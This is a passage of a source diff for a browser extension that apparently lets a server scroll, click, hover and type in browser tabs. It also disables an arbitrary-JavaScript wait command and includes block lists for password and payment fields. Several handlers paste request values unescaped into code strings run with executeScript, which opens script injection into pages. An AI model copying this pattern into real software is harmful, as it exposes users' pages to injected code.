@@ -293,6 +293,127 @@
             req.quality
           );
           break;
+        case "scroll-to-position":
+          await this.scrollToCoordinates(
+            req.correlationId,
+            req.tabId,
+            req.x,
+            req.y,
+            req.behavior
+          );
+          break;
+        case "scroll-by-offset":
+          await this.scrollByOffset(
+            req.correlationId,
+            req.tabId,
+            req.deltaX,
+            req.deltaY,
+            req.behavior
+          );
+          break;
+        case "scroll-to-element":
+          await this.scrollToElement(
+            req.correlationId,
+            req.tabId,
+            req.selector,
+            req.block,
+            req.inline,
+            req.behavior
+          );
+          break;
+        case "click-at-coordinates":
+          await this.clickAtCoordinates(
+            req.correlationId,
+            req.tabId,
+            req.x,
+            req.y,
+            req.button,
+            req.clickType,
+            req.modifiers
+          );
+          break;
+        case "click-element":
+          await this.clickElement(
+            req.correlationId,
+            req.tabId,
+            req.selector,
+            req.button,
+            req.clickType,
+            req.waitForElement,
+            req.scrollIntoView,
+            req.modifiers
+          );
+          break;
+        case "hover-element":
+          await this.hoverElement(
+            req.correlationId,
+            req.tabId,
+            req.selector,
+            req.x,
+            req.y,
+            req.waitForElement
+          );
+          break;
+        case "type-text":
+          await this.typeText(
+            req.correlationId,
+            req.tabId,
+            req.text,
+            req.selector,
+            req.clearFirst,
+            req.typeDelay,
+            req.waitForElement
+          );
+          break;
+        case "send-special-keys":
+          await this.sendSpecialKeys(
+            req.correlationId,
+            req.tabId,
+            req.keys,
+            req.selector,
+            req.modifiers
+          );
+          break;
+        case "clear-input-field":
+          await this.clearInputField(
+            req.correlationId,
+            req.tabId,
+            req.selector,
+            req.waitForElement
+          );
+          break;
+        case "wait-for-time":
+          await this.waitForTime(
+            req.correlationId,
+            req.duration,
+            req.message
+          );
+          break;
+        case "wait-for-element":
+          await this.waitForElement(
+            req.correlationId,
+            req.tabId,
+            req.selector,
+            req.timeout,
+            req.pollInterval,
+            req.visible
+          );
+          break;
+        case "wait-for-element-visibility":
+          await this.waitForElementVisibility(
+            req.correlationId,
+            req.tabId,
+            req.selector,
+            req.timeout,
+            req.threshold
+          );
+          break;
+        case "wait-for-condition":
+          await this.client.sendErrorToServer(
+            req.correlationId,
+            "wait-for-condition feature has been disabled for security reasons. This feature previously allowed arbitrary JavaScript execution which poses a critical security risk. Use specific wait operations like wait-for-element or wait-for-element-visibility instead."
+          );
+          break;
         default:
           const _exhaustiveCheck = req;
           console.error("Invalid message received:", req);
@@ -623,50 +744,1841 @@
       return imageDataUrl;
     }
     async stitchScreenshots(screenshots, viewportHeight, totalHeight) {
-      const canvas = new OffscreenCanvas(1, 1);
-      const ctx = canvas.getContext("2d");
-      if (!ctx) {
-        throw new Error("Failed to get canvas context for stitching");
+      if (screenshots.length === 1) {
+        return screenshots[0];
       }
-      const firstImage = await this.loadImage(screenshots[0]);
-      const width = firstImage.width;
-      canvas.width = width;
-      canvas.height = totalHeight;
-      let currentY = 0;
-      for (let i = 0; i < screenshots.length; i++) {
-        const image = await this.loadImage(screenshots[i]);
-        const remainingHeight = totalHeight - currentY;
-        const imageHeight = Math.min(image.height, remainingHeight);
-        if (imageHeight <= 0) break;
-        ctx.drawImage(
-          image,
-          0,
-          0,
-          width,
-          imageHeight,
-          // source
-          0,
-          currentY,
-          width,
-          imageHeight
-          // destination
-        );
-        currentY += imageHeight;
-        if (currentY >= totalHeight) break;
+      try {
+        const result = await this.executeStitchingInContentScript(screenshots, totalHeight);
+        return result;
+      } catch (error) {
+        console.error("Content script stitching failed, falling back to simple concatenation:", error);
+        return screenshots[0];
       }
-      const blob = await canvas.convertToBlob({ type: "image/png" });
-      return new Promise((resolve, reject) => {
-        const reader = new FileReader();
-        reader.onload = () => resolve(reader.result);
-        reader.onerror = () => reject(new Error("Failed to convert stitched image to data URL"));
-        reader.readAsDataURL(blob);
+    }
+    async executeStitchingInContentScript(screenshots, totalHeight) {
+      const tabs = await browser.tabs.query({ active: true, currentWindow: true });
+      if (!tabs.length) {
+        throw new Error("No active tab available for stitching operation");
+      }
+      const tabId = tabs[0].id;
+      const stitchingCode = `
+      (function() {
+        const screenshots = ${JSON.stringify(screenshots)};
+        const totalHeight = ${totalHeight};
+        
+        return new Promise((resolve, reject) => {
+          try {
+            // Load the first image to get dimensions
+            const firstImg = new Image();
+            firstImg.onload = function() {
+              const width = firstImg.width;
+              
+              // Create canvas in DOM context (available in content scripts)
+              const canvas = document.createElement('canvas');
+              canvas.width = width;
+              canvas.height = totalHeight;
+              const ctx = canvas.getContext('2d');
+              
+              if (!ctx) {
+                reject(new Error('Failed to get canvas context'));
+                return;
+              }
+              
+              let currentY = 0;
+              let loadedImages = 0;
+              const images = [];
+              
+              // Load all images first
+              for (let i = 0; i < screenshots.length; i++) {
+                const img = new Image();
+                img.onload = function() {
+                  images[i] = img;
+                  loadedImages++;
+                  
+                  // When all images are loaded, stitch them
+                  if (loadedImages === screenshots.length) {
+                    try {
+                      currentY = 0;
+                      for (let j = 0; j < images.length; j++) {
+                        const image = images[j];
+                        const remainingHeight = totalHeight - currentY;
+                        const imageHeight = Math.min(image.height, remainingHeight);
+                        
+                        if (imageHeight <= 0) break;
+                        
+                        ctx.drawImage(
+                          image,
+                          0, 0, width, imageHeight,
+                          0, currentY, width, imageHeight
+                        );
+                        
+                        currentY += imageHeight;
+                        if (currentY >= totalHeight) break;
+                      }
+                      
+                      // Convert to data URL
+                      const dataUrl = canvas.toDataURL('image/png');
+                      resolve(dataUrl);
+                    } catch (error) {
+                      reject(error);
+                    }
+                  }
+                };
+                img.onerror = () => reject(new Error(\`Failed to load image \${i}\`));
+                img.src = screenshots[i];
+              }
+            };
+            firstImg.onerror = () => reject(new Error('Failed to load first image'));
+            firstImg.src = screenshots[0];
+          } catch (error) {
+            reject(error);
+          }
+        });
+      })();
+    `;
+      const results = await browser.tabs.executeScript(tabId, {
+        code: stitchingCode
       });
+      if (!results || !results[0]) {
+        throw new Error("Stitching script execution failed");
+      }
+      return results[0];
     }
     async loadImage(dataUrl) {
-      const response = await fetch(dataUrl);
-      const blob = await response.blob();
-      return await createImageBitmap(blob);
+      return new Promise((resolve, reject) => {
+        const img = new Image();
+        img.onload = () => resolve(img);
+        img.onerror = () => reject(new Error("Failed to load image"));
+        img.src = dataUrl;
+      });
     }
+    async scrollToCoordinates(correlationId, tabId, x = 0, y, behavior = "smooth") {
+      try {
+        if (!Number.isInteger(tabId) || tabId < 0) {
+          throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
+        }
+        if (!Number.isInteger(x) || x < 0) {
+          throw new Error(`Invalid x coordinate: ${x}. X coordinate must be a non-negative integer.`);
+        }
+        if (!Number.isInteger(y) || y < 0) {
+          throw new Error(`Invalid y coordinate: ${y}. Y coordinate must be a non-negative integer.`);
+        }
+        const tab = await browser.tabs.get(tabId);
+        if (!tab || tab.status !== "complete") {
+          throw new Error(`Tab ${tabId} not found or not ready`);
+        }
+        if (tab.url && await isDomainInDenyList(tab.url)) {
+          throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
+        }
+        const results = await browser.tabs.executeScript(tabId, {
+          code: `
+          (function() {
+            try {
+              // Scroll to the specified position
+              window.scrollTo({
+                top: ${y},
+                left: ${x},
+                behavior: '${behavior}'
+              });
+              
+              // Wait a moment for smooth scrolling to complete
+              return new Promise(resolve => {
+                const checkPosition = () => {
+                  const finalX = window.pageXOffset || document.documentElement.scrollLeft;
+                  const finalY = window.pageYOffset || document.documentElement.scrollTop;
+                  resolve({
+                    success: true,
+                    finalPosition: { x: finalX, y: finalY },
+                    message: "Scrolled to position successfully"
+                  });
+                };
+                
+                if ('${behavior}' === 'smooth') {
+                  setTimeout(checkPosition, 500); // Wait for smooth scroll
+                } else {
+                  checkPosition();
+                }
+              });
+            } catch (error) {
+              return {
+                success: false,
+                finalPosition: { x: window.pageXOffset || 0, y: window.pageYOffset || 0 },
+                message: "Scroll failed: " + error.message
+              };
+            }
+          })();
+        `
+        });
+        const result = results[0];
+        await this.client.sendResourceToServer({
+          resource: "scroll-result",
+          correlationId,
+          success: result.success,
+          finalPosition: result.finalPosition,
+          message: result.message,
+          timestamp: Date.now()
+        });
+      } catch (error) {
+        console.error("Scroll to position failed:", error);
+        await this.client.sendResourceToServer({
+          resource: "scroll-result",
+          correlationId,
+          success: false,
+          finalPosition: { x: 0, y: 0 },
+          message: `Scroll failed: ${error instanceof Error ? error.message : "Unknown error"}`,
+          timestamp: Date.now()
+        });
+      }
+    }
+    async scrollByOffset(correlationId, tabId, deltaX = 0, deltaY, behavior = "smooth") {
+      try {
+        if (!Number.isInteger(tabId) || tabId < 0) {
+          throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
+        }
+        if (!Number.isInteger(deltaX)) {
+          throw new Error(`Invalid deltaX: ${deltaX}. DeltaX must be an integer.`);
+        }
+        if (!Number.isInteger(deltaY)) {
+          throw new Error(`Invalid deltaY: ${deltaY}. DeltaY must be an integer.`);
+        }
+        const tab = await browser.tabs.get(tabId);
+        if (!tab || tab.status !== "complete") {
+          throw new Error(`Tab ${tabId} not found or not ready`);
+        }
+        if (tab.url && await isDomainInDenyList(tab.url)) {
+          throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
+        }
+        const results = await browser.tabs.executeScript(tabId, {
+          code: `
+          (function() {
+            try {
+              // Scroll by the specified offset
+              window.scrollBy({
+                top: ${deltaY},
+                left: ${deltaX},
+                behavior: '${behavior}'
+              });
+              
+              // Wait a moment for smooth scrolling to complete
+              return new Promise(resolve => {
+                const checkPosition = () => {
+                  const finalX = window.pageXOffset || document.documentElement.scrollLeft;
+                  const finalY = window.pageYOffset || document.documentElement.scrollTop;
+                  resolve({
+                    success: true,
+                    finalPosition: { x: finalX, y: finalY },
+                    message: "Scrolled by offset successfully"
+                  });
+                };
+                
+                if ('${behavior}' === 'smooth') {
+                  setTimeout(checkPosition, 500); // Wait for smooth scroll
+                } else {
+                  checkPosition();
+                }
+              });
+            } catch (error) {
+              return {
+                success: false,
+                finalPosition: { x: window.pageXOffset || 0, y: window.pageYOffset || 0 },
+                message: "Scroll failed: " + error.message
+              };
+            }
+          })();
+        `
+        });
+        const result = results[0];
+        await this.client.sendResourceToServer({
+          resource: "scroll-result",
+          correlationId,
+          success: result.success,
+          finalPosition: result.finalPosition,
+          message: result.message,
+          timestamp: Date.now()
+        });
+      } catch (error) {
+        console.error("Scroll by offset failed:", error);
+        await this.client.sendResourceToServer({
+          resource: "scroll-result",
+          correlationId,
+          success: false,
+          finalPosition: { x: 0, y: 0 },
+          message: `Scroll failed: ${error instanceof Error ? error.message : "Unknown error"}`,
+          timestamp: Date.now()
+        });
+      }
+    }
+    async scrollToElement(correlationId, tabId, selector, block = "center", inline = "nearest", behavior = "smooth") {
+      try {
+        if (!Number.isInteger(tabId) || tabId < 0) {
+          throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
+        }
+        if (!selector || typeof selector !== "string") {
+          throw new Error(`Invalid selector: selector must be a non-empty string.`);
+        }
+        if (selector.includes("<") || selector.includes(">") || selector.includes("script")) {
+          throw new Error(`Invalid selector: potentially dangerous characters detected.`);
+        }
+        const tab = await browser.tabs.get(tabId);
+        if (!tab || tab.status !== "complete") {
+          throw new Error(`Tab ${tabId} not found or not ready`);
+        }
+        if (tab.url && await isDomainInDenyList(tab.url)) {
+          throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
+        }
+        const results = await browser.tabs.executeScript(tabId, {
+          code: `
+          (function() {
+            try {
+              // Find the element using the provided selector
+              const element = document.querySelector('${selector.replace(/'/g, "\\'")}');
+              if (!element) {
+                return {
+                  success: false,
+                  finalPosition: {
+                    x: window.pageXOffset || document.documentElement.scrollLeft,
+                    y: window.pageYOffset || document.documentElement.scrollTop
+                  },
+                  message: "Element not found with selector: ${selector.replace(/'/g, "\\'")}"
+                };
+              }
+              
+              // Scroll element into view
+              element.scrollIntoView({
+                behavior: '${behavior}',
+                block: '${block}',
+                inline: '${inline}'
+              });
+              
+              // Wait a moment for smooth scrolling to complete
+              return new Promise(resolve => {
+                const checkPosition = () => {
+                  const finalX = window.pageXOffset || document.documentElement.scrollLeft;
+                  const finalY = window.pageYOffset || document.documentElement.scrollTop;
+                  resolve({
+                    success: true,
+                    finalPosition: { x: finalX, y: finalY },
+                    message: "Scrolled to element successfully"
+                  });
+                };
+                
+                if ('${behavior}' === 'smooth') {
+                  setTimeout(checkPosition, 500); // Wait for smooth scroll
+                } else {
+                  checkPosition();
+                }
+              });
+            } catch (error) {
+              return {
+                success: false,
+                finalPosition: {
+                  x: window.pageXOffset || document.documentElement.scrollLeft || 0,
+                  y: window.pageYOffset || document.documentElement.scrollTop || 0
+                },
+                message: "Scroll failed: " + error.message
+              };
+            }
+          })();
+        `
+        });
+        const result = results[0];
+        await this.client.sendResourceToServer({
+          resource: "scroll-result",
+          correlationId,
+          success: result.success,
+          finalPosition: result.finalPosition,
+          message: result.message,
+          timestamp: Date.now()
+        });
+      } catch (error) {
+        console.error("Scroll to element failed:", error);
+        await this.client.sendResourceToServer({
+          resource: "scroll-result",
+          correlationId,
+          success: false,
+          finalPosition: { x: 0, y: 0 },
+          message: `Scroll failed: ${error instanceof Error ? error.message : "Unknown error"}`,
+          timestamp: Date.now()
+        });
+      }
+    }
+    async clickAtCoordinates(correlationId, tabId, x, y, button = "left", clickType = "single", modifiers = {}) {
+      try {
+        if (!Number.isInteger(tabId) || tabId < 0) {
+          throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
+        }
+        if (!Number.isInteger(x) || x < 0) {
+          throw new Error(`Invalid x coordinate: ${x}. X coordinate must be a non-negative integer.`);
+        }
+        if (!Number.isInteger(y) || y < 0) {
+          throw new Error(`Invalid y coordinate: ${y}. Y coordinate must be a non-negative integer.`);
+        }
+        const tab = await browser.tabs.get(tabId);
+        if (!tab || tab.status !== "complete") {
+          throw new Error(`Tab ${tabId} not found or not ready`);
+        }
+        if (tab.url && await isDomainInDenyList(tab.url)) {
+          throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
+        }
+        const results = await browser.tabs.executeScript(tabId, {
+          code: `
+          (function() {
+            try {
+              // Get the button code for MouseEvent
+              const buttonCode = {
+                'left': 0,
+                'middle': 1,
+                'right': 2
+              }['${button}'];
+              
+              // Find element at coordinates
+              const elementAtPoint = document.elementFromPoint(${x}, ${y});
+              if (!elementAtPoint) {
+                return {
+                  success: false,
+                  elementFound: false,
+                  clickExecuted: false,
+                  message: "No element found at coordinates (${x}, ${y})"
+                };
+              }
+              
+              // Security check - block clicks on sensitive elements
+              const tagName = elementAtPoint.tagName.toLowerCase();
+              const inputType = elementAtPoint.type?.toLowerCase();
+              if ((tagName === 'input' && (inputType === 'password' || inputType === 'file')) ||
+                  tagName === 'script' || tagName === 'iframe') {
+                return {
+                  success: false,
+                  elementFound: true,
+                  clickExecuted: false,
+                  message: "Click blocked on sensitive element for security reasons"
+                };
+              }
+              
+              // Create modifiers object
+              const modifierKeys = {
+                ctrlKey: ${modifiers.ctrl || false},
+                altKey: ${modifiers.alt || false},
+                shiftKey: ${modifiers.shift || false},
+                metaKey: ${modifiers.meta || false}
+              };
+              
+              // Dispatch click event(s)
+              if ('${clickType}' === 'double') {
+                // For double click, dispatch both click and dblclick events
+                const clickEvent = new MouseEvent('click', {
+                  bubbles: true,
+                  cancelable: true,
+                  view: window,
+                  button: buttonCode,
+                  buttons: 1 << buttonCode,
+                  clientX: ${x},
+                  clientY: ${y},
+                  ...modifierKeys
+                });
+                elementAtPoint.dispatchEvent(clickEvent);
+                
+                const dblClickEvent = new MouseEvent('dblclick', {
+                  bubbles: true,
+                  cancelable: true,
+                  view: window,
+                  button: buttonCode,
+                  buttons: 1 << buttonCode,
+                  detail: 2,
+                  clientX: ${x},
+                  clientY: ${y},
+                  ...modifierKeys
+                });
+                elementAtPoint.dispatchEvent(dblClickEvent);
+              } else if ('${button}' === 'right') {
+                // For right click, dispatch contextmenu event
+                const contextMenuEvent = new MouseEvent('contextmenu', {
+                  bubbles: true,
+                  cancelable: true,
+                  view: window,
+                  button: buttonCode,
+                  buttons: 1 << buttonCode,
+                  clientX: ${x},
+                  clientY: ${y},
+                  ...modifierKeys
+                });
+                elementAtPoint.dispatchEvent(contextMenuEvent);
+              } else {
+                // Regular click
+                const clickEvent = new MouseEvent('click', {
+                  bubbles: true,
+                  cancelable: true,
+                  view: window,
+                  button: buttonCode,
+                  buttons: 1 << buttonCode,
+                  clientX: ${x},
+                  clientY: ${y},
+                  ...modifierKeys
+                });
+                elementAtPoint.dispatchEvent(clickEvent);
+              }
+              
+              // Get element info
+              const rect = elementAtPoint.getBoundingClientRect();
+              const style = window.getComputedStyle(elementAtPoint);
+              const isVisible = style.display !== 'none' && style.visibility !== 'hidden' &&
+                               rect.width > 0 && rect.height > 0;
+              
+              return {
+                success: true,
+                elementFound: true,
+                clickExecuted: true,
+                message: "Click executed successfully at coordinates (${x}, ${y})",
+                elementInfo: {
+                  exists: true,
+                  visible: isVisible,
+                  interactable: !elementAtPoint.disabled,
+                  boundingRect: {
+                    x: rect.x,
+                    y: rect.y,
+                    width: rect.width,
+                    height: rect.height,
+                    top: rect.top,
+                    right: rect.right,
+                    bottom: rect.bottom,
+                    left: rect.left
+                  }
+                }
+              };
+            } catch (error) {
+              return {
+                success: false,
+                elementFound: false,
+                clickExecuted: false,
+                message: "Click failed: " + error.message
+              };
+            }
+          })();
+        `
+        });
+        const result = results[0];
+        await this.client.sendResourceToServer({
+          resource: "click-result",
+          correlationId,
+          success: result.success,
+          elementFound: result.elementFound,
+          clickExecuted: result.clickExecuted,
+          message: result.message,
+          timestamp: Date.now(),
+          elementInfo: result.elementInfo
+        });
+      } catch (error) {
+        console.error("Click at coordinates failed:", error);
+        await this.client.sendResourceToServer({
+          resource: "click-result",
+          correlationId,
+          success: false,
+          elementFound: false,
+          clickExecuted: false,
+          message: `Click failed: ${error instanceof Error ? error.message : "Unknown error"}`,
+          timestamp: Date.now()
+        });
+      }
+    }
+    async clickElement(correlationId, tabId, selector, button = "left", clickType = "single", waitForElement = 5e3, scrollIntoView = true, modifiers = {}) {
+      try {
+        if (!Number.isInteger(tabId) || tabId < 0) {
+          throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
+        }
+        if (!selector || typeof selector !== "string") {
+          throw new Error(`Invalid selector: selector must be a non-empty string.`);
+        }
+        if (selector.includes("<") || selector.includes(">") || selector.includes("script")) {
+          throw new Error(`Invalid selector: potentially dangerous characters detected.`);
+        }
+        const tab = await browser.tabs.get(tabId);
+        if (!tab || tab.status !== "complete") {
+          throw new Error(`Tab ${tabId} not found or not ready`);
+        }
+        if (tab.url && await isDomainInDenyList(tab.url)) {
+          throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
+        }
+        const results = await browser.tabs.executeScript(tabId, {
+          code: `
+          (function() {
+            return new Promise((resolve) => {
+              try {
+                let element = null;
+                let attempts = 0;
+                const maxAttempts = Math.max(1, ${waitForElement} / 100);
+                
+                function findAndClickElement() {
+                  attempts++;
+                  element = document.querySelector('${selector.replace(/'/g, "\\'")}');
+                  
+                  if (!element) {
+                    if (attempts < maxAttempts) {
+                      setTimeout(findAndClickElement, 100);
+                      return;
+                    } else {
+                      resolve({
+                        success: false,
+                        elementFound: false,
+                        clickExecuted: false,
+                        message: "Element not found with selector: ${selector.replace(/'/g, "\\'")}"
+                      });
+                      return;
+                    }
+                  }
+                  
+                  // Security check - block clicks on sensitive elements
+                  const tagName = element.tagName.toLowerCase();
+                  const inputType = element.type?.toLowerCase();
+                  if ((tagName === 'input' && (inputType === 'password' || inputType === 'file')) ||
+                      tagName === 'script' || tagName === 'iframe') {
+                    resolve({
+                      success: false,
+                      elementFound: true,
+                      clickExecuted: false,
+                      message: "Click blocked on sensitive element for security reasons"
+                    });
+                    return;
+                  }
+                  
+                  // Scroll element into view if requested
+                  if (${scrollIntoView}) {
+                    element.scrollIntoView({
+                      behavior: 'smooth',
+                      block: 'center',
+                      inline: 'nearest'
+                    });
+                  }
+                  
+                  // Get the button code for MouseEvent
+                  const buttonCode = {
+                    'left': 0,
+                    'middle': 1,
+                    'right': 2
+                  }['${button}'];
+                  
+                  // Create modifiers object
+                  const modifierKeys = {
+                    ctrlKey: ${modifiers.ctrl || false},
+                    altKey: ${modifiers.alt || false},
+                    shiftKey: ${modifiers.shift || false},
+                    metaKey: ${modifiers.meta || false}
+                  };
+                  
+                  // Get element center coordinates for event
+                  const rect = element.getBoundingClientRect();
+                  const centerX = rect.left + rect.width / 2;
+                  const centerY = rect.top + rect.height / 2;
+                  
+                  // Dispatch click event(s)
+                  if ('${clickType}' === 'double') {
+                    // For double click, dispatch both click and dblclick events
+                    const clickEvent = new MouseEvent('click', {
+                      bubbles: true,
+                      cancelable: true,
+                      view: window,
+                      button: buttonCode,
+                      buttons: 1 << buttonCode,
+                      clientX: centerX,
+                      clientY: centerY,
+                      ...modifierKeys
+                    });
+                    element.dispatchEvent(clickEvent);
+                    
+                    const dblClickEvent = new MouseEvent('dblclick', {
+                      bubbles: true,
+                      cancelable: true,
+                      view: window,
+                      button: buttonCode,
+                      buttons: 1 << buttonCode,
+                      detail: 2,
+                      clientX: centerX,
+                      clientY: centerY,
+                      ...modifierKeys
+                    });
+                    element.dispatchEvent(dblClickEvent);
+                  } else if ('${button}' === 'right') {
+                    // For right click, dispatch contextmenu event
+                    const contextMenuEvent = new MouseEvent('contextmenu', {
+                      bubbles: true,
+                      cancelable: true,
+                      view: window,
+                      button: buttonCode,
+                      buttons: 1 << buttonCode,
+                      clientX: centerX,
+                      clientY: centerY,
+                      ...modifierKeys
+                    });
+                    element.dispatchEvent(contextMenuEvent);
+                  } else {
+                    // Regular click - also try the native click method
+                    if (typeof element.click === 'function') {
+                      element.click();
+                    }
+                    
+                    const clickEvent = new MouseEvent('click', {
+                      bubbles: true,
+                      cancelable: true,
+                      view: window,
+                      button: buttonCode,
+                      buttons: 1 << buttonCode,
+                      clientX: centerX,
+                      clientY: centerY,
+                      ...modifierKeys
+                    });
+                    element.dispatchEvent(clickEvent);
+                  }
+                  
+                  // Get element info
+                  const style = window.getComputedStyle(element);
+                  const isVisible = style.display !== 'none' && style.visibility !== 'hidden' &&
+                                   rect.width > 0 && rect.height > 0;
+                  
+                  resolve({
+                    success: true,
+                    elementFound: true,
+                    clickExecuted: true,
+                    message: "Element clicked successfully",
+                    elementInfo: {
+                      exists: true,
+                      visible: isVisible,
+                      interactable: !element.disabled,
+                      boundingRect: {
+                        x: rect.x,
+                        y: rect.y,
+                        width: rect.width,
+                        height: rect.height,
+                        top: rect.top,
+                        right: rect.right,
+                        bottom: rect.bottom,
+                        left: rect.left
+                      }
+                    }
+                  });
+                }
+                
+                findAndClickElement();
+              } catch (error) {
+                resolve({
+                  success: false,
+                  elementFound: false,
+                  clickExecuted: false,
+                  message: "Click failed: " + error.message
+                });
+              }
+            });
+          })();
+        `
+        });
+        const result = results[0];
+        await this.client.sendResourceToServer({
+          resource: "click-result",
+          correlationId,
+          success: result.success,
+          elementFound: result.elementFound,
+          clickExecuted: result.clickExecuted,
+          message: result.message,
+          timestamp: Date.now(),
+          elementInfo: result.elementInfo
+        });
+      } catch (error) {
+        console.error("Click element failed:", error);
+        await this.client.sendResourceToServer({
+          resource: "click-result",
+          correlationId,
+          success: false,
+          elementFound: false,
+          clickExecuted: false,
+          message: `Click failed: ${error instanceof Error ? error.message : "Unknown error"}`,
+          timestamp: Date.now()
+        });
+      }
+    }
+    async hoverElement(correlationId, tabId, selector, x, y, waitForElement = 5e3) {
+      try {
+        if (!Number.isInteger(tabId) || tabId < 0) {
+          throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
+        }
+        if (!selector && (x === void 0 || y === void 0)) {
+          throw new Error(`Either selector or x,y coordinates must be provided for hover`);
+        }
+        if (selector && (typeof selector !== "string" || !selector)) {
+          throw new Error(`Invalid selector: selector must be a non-empty string.`);
+        }
+        if (x !== void 0 && (!Number.isInteger(x) || x < 0)) {
+          throw new Error(`Invalid x coordinate: ${x}. X coordinate must be a non-negative integer.`);
+        }
+        if (y !== void 0 && (!Number.isInteger(y) || y < 0)) {
+          throw new Error(`Invalid y coordinate: ${y}. Y coordinate must be a non-negative integer.`);
+        }
+        if (selector && (selector.includes("<") || selector.includes(">") || selector.includes("script"))) {
+          throw new Error(`Invalid selector: potentially dangerous characters detected.`);
+        }
+        const tab = await browser.tabs.get(tabId);
+        if (!tab || tab.status !== "complete") {
+          throw new Error(`Tab ${tabId} not found or not ready`);
+        }
+        if (tab.url && await isDomainInDenyList(tab.url)) {
+          throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
+        }
+        const results = await browser.tabs.executeScript(tabId, {
+          code: `
+          (function() {
+            return new Promise((resolve) => {
+              try {
+                let element = null;
+                let hoverX = ${x || 0};
+                let hoverY = ${y || 0};
+                
+                ${selector ? `
+                  // Find element by selector
+                  let attempts = 0;
+                  const maxAttempts = Math.max(1, ${waitForElement} / 100);
+                  
+                  function findElement() {
+                    attempts++;
+                    element = document.querySelector('${selector.replace(/'/g, "\\'")}');
+                    
+                    if (!element) {
+                      if (attempts < maxAttempts) {
+                        setTimeout(findElement, 100);
+                        return;
+                      } else {
+                        resolve({
+                          success: false,
+                          elementFound: false,
+                          message: "Element not found with selector: ${selector.replace(/'/g, "\\'")}"
+                        });
+                        return;
+                      }
+                    }
+                    
+                    performHover();
+                  }
+                  
+                  function performHover() {
+                    // Get element center coordinates
+                    const rect = element.getBoundingClientRect();
+                    hoverX = rect.left + rect.width / 2;
+                    hoverY = rect.top + rect.height / 2;
+                    
+                    executeHover();
+                  }
+                  
+                  findElement();
+                ` : `
+                  // Use coordinates directly
+                  element = document.elementFromPoint(hoverX, hoverY);
+                  executeHover();
+                `}
+                
+                function executeHover() {
+                  try {
+                    // Dispatch mouseenter event (doesn't bubble)
+                    const mouseEnterEvent = new MouseEvent('mouseenter', {
+                      bubbles: false,
+                      cancelable: false,
+                      view: window,
+                      clientX: hoverX,
+                      clientY: hoverY
+                    });
+                    
+                    // Dispatch mouseover event (bubbles)
+                    const mouseOverEvent = new MouseEvent('mouseover', {
+                      bubbles: true,
+                      cancelable: true,
+                      view: window,
+                      clientX: hoverX,
+                      clientY: hoverY
+                    });
+                    
+                    if (element) {
+                      element.dispatchEvent(mouseEnterEvent);
+                      element.dispatchEvent(mouseOverEvent);
+                    } else {
+                      // If no element at coordinates, dispatch on document
+                      document.dispatchEvent(mouseOverEvent);
+                    }
+                    
+                    // Get element info if element exists
+                    let elementInfo = undefined;
+                    if (element) {
+                      const rect = element.getBoundingClientRect();
+                      const style = window.getComputedStyle(element);
+                      const isVisible = style.display !== 'none' && style.visibility !== 'hidden' &&
+                                       rect.width > 0 && rect.height > 0;
+                      
+                      elementInfo = {
+                        exists: true,
+                        visible: isVisible,
+                        interactable: !element.disabled,
+                        boundingRect: {
+                          x: rect.x,
+                          y: rect.y,
+                          width: rect.width,
+                          height: rect.height,
+                          top: rect.top,
+                          right: rect.right,
+                          bottom: rect.bottom,
+                          left: rect.left
+                        }
+                      };
+                    }
+                    
+                    resolve({
+                      success: true,
+                      elementFound: !!element,
+                      message: element ? "Hover executed successfully on element" : "Hover executed at coordinates",
+                      elementInfo: elementInfo
+                    });
+                  } catch (error) {
+                    resolve({
+                      success: false,
+                      elementFound: !!element,
+                      message: "Hover failed: " + error.message
+                    });
+                  }
+                }
+              } catch (error) {
+                resolve({
+                  success: false,
+                  elementFound: false,
+                  message: "Hover failed: " + error.message
+                });
+              }
+            });
+          })();
+        `
+        });
+        const result = results[0];
+        await this.client.sendResourceToServer({
+          resource: "hover-result",
+          correlationId,
+          success: result.success,
+          elementFound: result.elementFound,
+          message: result.message,
+          timestamp: Date.now(),
+          elementInfo: result.elementInfo
+        });
+      } catch (error) {
+        console.error("Hover element failed:", error);
+        await this.client.sendResourceToServer({
+          resource: "hover-result",
+          correlationId,
+          success: false,
+          elementFound: false,
+          message: `Hover failed: ${error instanceof Error ? error.message : "Unknown error"}`,
+          timestamp: Date.now()
+        });
+      }
+    }
+    async typeText(correlationId, tabId, text, selector, clearFirst, typeDelay, waitForElement) {
+      try {
+        if (!Number.isInteger(tabId) || tabId < 0) {
+          throw new Error(`Invalid tab ID: ${tabId}`);
+        }
+        if (typeof text !== "string") {
+          throw new Error("Text must be a string");
+        }
+        const sanitizedText = text.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, "");
+        if (selector) {
+          const sensitivePatterns = [
+            /credit.?card/i,
+            /ccn/i,
+            /cvv/i,
+            /ssn/i,
+            /social.?security/i,
+            /password/i,
+            /pin/i
+          ];
+          if (sensitivePatterns.some((pattern) => pattern.test(selector))) {
+            throw new Error("Typing in sensitive fields is blocked for security");
+          }
+        }
+        const finalTypeDelay = Math.max(0, Math.min(typeDelay || 0, 1e3));
+        const finalWaitForElement = Math.max(0, Math.min(waitForElement || 5e3, 1e4));
+        const results = await browser.tabs.executeScript(tabId, {
+          code: `
+          (async function() {
+            try {
+              let targetElement;
+              
+              // Find target element
+              if ("${selector}") {
+                const selectorStr = "${selector}";
+                targetElement = document.querySelector(selectorStr);
+                
+                if (!targetElement) {
+                  // Wait for element if waitForElement is specified
+                  if (${finalWaitForElement} > 0) {
+                    const startTime = Date.now();
+                    while (!targetElement && (Date.now() - startTime) < ${finalWaitForElement}) {
+                      await new Promise(resolve => setTimeout(resolve, 100));
+                      targetElement = document.querySelector(selectorStr);
+                    }
+                  }
+                  
+                  if (!targetElement) {
+                    return {
+                      success: false,
+                      message: "Element not found: " + selectorStr,
+                      charactersTyped: 0,
+                      elementInfo: { exists: false, visible: false, interactable: false }
